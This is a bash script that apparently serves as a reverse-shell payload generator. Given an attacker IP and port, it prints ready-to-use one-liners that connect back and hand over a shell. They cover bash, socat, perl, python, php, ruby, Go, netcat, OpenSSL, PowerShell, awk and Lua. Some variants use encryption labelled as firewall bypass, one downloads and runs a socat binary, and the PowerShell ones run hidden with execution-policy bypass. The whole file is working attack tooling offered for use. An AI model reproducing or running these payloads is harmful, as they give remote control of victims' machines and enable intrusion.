#!/bin/bash

# /* VmlhZGluIEN1cmlvc28=  */ #
# /* ZmVpdG8gcG9yIG5vd2Fr */ #

if [[ $1 == "" || $2 == "" ]];then
	echo "
$0 IP PORT
";exit
fi

R='\033[0;31m'
W='\033[1;37m'
echo -e "
$R[$W#$R]$W Select one option $R[$W#$R]$W

$R(\033[1;37m1$R)$W Bash
$R(\033[1;37m2$R)$W Socat
$R(\033[1;37m3$R)$W Perl
$R(\033[1;37m4$R)$W Python
$R(\033[1;37m5$R)$W Php
$R(\033[1;37m6$R)$W Ruby
$R(\033[1;37m7$R)$W Golang
$R(\033[1;37m8$R)$W Netcat
$R(\033[1;37m9$R)$W OpenSSL
$R(\033[1;37m10$R)$W Powershell
$R(\033[1;37m11$R)$W Awk
$R(\033[1;37m12$R)$W Lua
";printf "reverse@shell:${R}~${W}# ";read shell

case $shell in
	1)
		echo -e "
TCP

bash -i >& /dev/tcp/$1/$2 0>&1 2>&1
0<&196;exec 196<>/dev/tcp/$1/$2; sh <&196 >&196 2>&196

UDP

sh -i >& /dev/udp/$1/$2 0>&1
";;
	2)
		echo -e "
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$1:$2

wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$1:$2
";;
	3)
		echo -e "
perl -e 'use Socket;\$i=\"$1\";\$p=$2;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'

perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$1:$2\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'

Windows

perl -MIO -e '\$c=new IO::Socket::INET(PeerAddr,\"$1:$2\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'
";;
	4)
		echo -e "
export RHOST=\"$1\";export RPORT=$2;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'
";;
	5)
		echo -e "
php -r '\$sock=fsockopen(\"$1\",$2);exec(\"/bin/sh -i <&3 >&3 2>&3\");'
php -r '\$sock=fsockopen(\"$1\",$2);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'
php -r '\$sock=fsockopen(\"$1\",$2);\`/bin/sh -i <&3 >&3 2>&3\`;'
php -r '\$sock=fsockopen(\"$1\",$2);system(\"/bin/sh -i <&3 >&3 2>&3\");'
php -r '\$sock=fsockopen(\"$1\",$2);passthru(\"/bin/sh -i <&3 >&3 2>&3\");'
php -r '\$sock=fsockopen(\"$1\",$2);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'
php -r '\$sock=fsockopen(\"$1\",$2);\$proc=proc_open(\"/bin/sh -i\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);'
";;
	6)
		echo -e "
ruby -rsocket -e'f=TCPSocket.open(\"$1\",$2).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$1\",\"$2\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'

Windows

ruby -rsocket -e 'c=TCPSocket.new(\"$1\",\"$2\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'
";;
	7)
		echo -e "
echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$1:$2\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
";;
	8)
		echo -e "
nc -e /bin/sh $1 $2
nc -c \"/bin/bash\" $1 $2
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f
ncat $1 $2 -e /bin/sh
ncat --udp $1 $2 -e /bin/sh

- Firewall Bypass -
Reverse Com Criptografia (Necessario criar uma chave publica e privada)

ncat/nc $1 $2 -e /bin/sh --ssl
";;
	9)
		echo -e "
Maquina do atacante (listen mode):
ncat --ssl -vv -l -p $2
          ou
openssl s_server -quiet -key priv.pem -cert pub.pem -port $2

Reverse Com Criptografia (Necessario criar uma chave publica e privada):
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $1:$2 > /tmp/s; rm /tmp/s
";;
	10)
		echo -e "
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$1\",$2);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()

powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('$1',$2);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length).;\$stream.Flush()};\$client.Close()\"
";;
	11)
		echo -e "
awk 'BEGIN {s = \"/inet/tcp/0/$1/$2\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null
";;
	12)
		echo -e "
lua -e \"require('socket');require('os');t=socket.tcp();t:connect('$1','$2');os.execute('/bin/sh -i <&3 >&3 2>&3');\"

Windows / Linux

lua5.1 -e 'local host, port = \"$1\", $2 local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'
";;
	*)
		exit -1;;
esac
